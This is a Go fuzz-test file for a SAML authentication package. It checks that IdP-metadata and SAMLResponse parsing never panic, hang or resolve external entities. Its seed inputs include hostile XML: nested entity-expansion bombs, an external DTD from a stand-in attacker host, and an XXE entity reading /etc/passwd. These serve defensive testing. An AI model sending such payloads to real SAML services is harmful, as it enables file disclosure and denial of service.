// SPDX-License-Identifier: AGPL-3.0-or-later

package auth

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/base64"
	"encoding/pem"
	"math/big"
	"net/http"
	"net/url"
	"strings"
	"testing"
	"time"
)

// FuzzParseIDPMetadata asserts the IdP-metadata XML decoder never panics, hangs,
// or resolves external/DTD entities on arbitrary bytes. IdP metadata is supplied
// at provider-configuration time and is an XML trust boundary: malformed,
// truncated, deeply nested, or entity-laden documents must return a clean error.
func FuzzParseIDPMetadata(f *testing.F) {
	for _, s := range []string{
		`<EntityDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata" entityID="https://idp.example/meta"><IDPSSODescriptor protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol"><SingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect" Location="https://idp.example/sso"/></IDPSSODescriptor></EntityDescriptor>`,
		`<EntitiesDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata"><EntityDescriptor entityID="a"/><EntityDescriptor entityID="b"/></EntitiesDescriptor>`,
		`<EntitiesDescriptor/>`,
		`<EntityDescriptor entityID=""/>`,
		``,
		`<`,
		`<!DOCTYPE foo [<!ENTITY a "AAAA"><!ENTITY b "&a;&a;&a;&a;&a;">]><EntityDescriptor entityID="&b;"/>`,
		`<!DOCTYPE foo SYSTEM "http://attacker.example/evil.dtd"><EntityDescriptor entityID="x"/>`,
		`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><EntityDescriptor entityID="&xxe;"/>`,
		strings.Repeat("<a>", 5000) + strings.Repeat("</a>", 5000),
	} {
		f.Add([]byte(s))
	}
	f.Fuzz(func(t *testing.T, data []byte) {
		// A 1 MiB cap keeps a single fuzz iteration bounded; real metadata is small.
		if len(data) > 1<<20 {
			return
		}
		done := make(chan struct{})
		go func() {
			defer close(done)
			ed, err := parseIDPMetadata(data) // must not panic
			if err == nil && ed == nil {
				t.Error("parseIDPMetadata returned nil descriptor with nil error")
			}
		}()
		select {
		case <-done:
		case <-time.After(10 * time.Second):
			t.Fatalf("parseIDPMetadata did not return within 10s on %d bytes (entity expansion / quadratic blowup?)", len(data))
		}
	})
}

// FuzzParseACS asserts the full SAMLResponse parse path (base64 → XML → crewjam
// ParseResponse → assertion mapping) never panics on an attacker-controlled
// SAMLResponse form value. The IdP response is wholly attacker-controlled before
// signature verification, so every malformed/hostile document must surface as an
// error, not a crash or hang.
func FuzzParseACS(f *testing.F) {
	a := fuzzSAMLAuthenticator(f)
	for _, s := range []string{
		``,
		`<Response/>`,
		`not xml`,
		`<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"></samlp:Response>`,
		`<!DOCTYPE foo [<!ENTITY a "x"><!ENTITY b "&a;&a;">]><Response>&b;</Response>`,
		strings.Repeat("<a>", 2000) + strings.Repeat("</a>", 2000),
	} {
		f.Add([]byte(s))
	}
	f.Fuzz(func(t *testing.T, samlResponse []byte) {
		if len(samlResponse) > 1<<20 {
			return
		}
		encoded := base64.StdEncoding.EncodeToString(samlResponse)
		form := url.Values{"SAMLResponse": {encoded}, "RelayState": {"x"}}
		req, err := http.NewRequest(http.MethodPost, "https://sp.example/acs", strings.NewReader(form.Encode()))
		if err != nil {
			t.Skip()
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

		done := make(chan struct{})
		go func() {
			defer close(done)
			// A valid signature is impossible here, so a successful parse would itself be
			// a finding; we only assert no panic and a clean return.
			_, _ = a.ParseACS(req, []string{"id-1"}) // must not panic
		}()
		select {
		case <-done:
		case <-time.After(10 * time.Second):
			t.Fatalf("ParseACS did not return within 10s on %d bytes (entity expansion / quadratic blowup?)", len(samlResponse))
		}
	})
}

func fuzzSAMLAuthenticator(f *testing.F) *SAMLAuthenticator {
	f.Helper()
	certPEM, keyPEM := selfSignedPEMForFuzz(f)
	idpMetadata := `<EntityDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata" entityID="https://idp.example/meta">` +
		`<IDPSSODescriptor protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">` +
		`<SingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect" Location="https://idp.example/sso"/>` +
		`</IDPSSODescriptor></EntityDescriptor>`
	a, err := NewSAMLAuthenticator(SAMLConfig{
		Name: "fuzz", EntityID: "https://sp.example/meta", ACSURL: "https://sp.example/acs",
		IDPMetadataXML: idpMetadata, CertPEM: certPEM, KeyPEM: keyPEM,
		Org: "demo", Workspace: "main",
	})
	if err != nil {
		f.Fatalf("build authenticator: %v", err)
	}
	return a
}

func selfSignedPEMForFuzz(f *testing.F) (certPEM, keyPEM string) {
	f.Helper()
	priv, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		f.Fatal(err)
	}
	tmpl := &x509.Certificate{
		SerialNumber: big.NewInt(1),
		Subject:      pkix.Name{CommonName: "fuzz-sp"},
		NotBefore:    time.Now().Add(-time.Hour),
		NotAfter:     time.Now().Add(time.Hour),
	}
	der, err := x509.CreateCertificate(rand.Reader, tmpl, tmpl, &priv.PublicKey, priv)
	if err != nil {
		f.Fatal(err)
	}
	cert := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: der})
	key := pem.EncodeToMemory(&pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(priv)})
	return string(cert), string(key)
}
